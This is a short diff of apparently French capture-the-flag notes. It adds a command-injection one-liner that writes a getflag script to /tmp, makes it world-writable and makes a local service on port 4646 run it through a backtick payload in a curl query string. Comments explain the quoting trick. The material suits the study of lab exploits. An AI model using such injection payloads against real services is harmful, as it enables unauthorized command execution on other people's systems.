@@ -1,4 +1,4 @@
-curl 127.0.0.1:4646?x='`/*/S`'
+echo 'getflag > /tmp/r12;' > /tmp/S && chmod 777 /tmp/S && curl 127.0.0.1:4646?x='`/*/S`' && cat /tmp/r12
 
 - single quotes : pour ne pas que bash l'execute
 - avec des backticks : pour executer
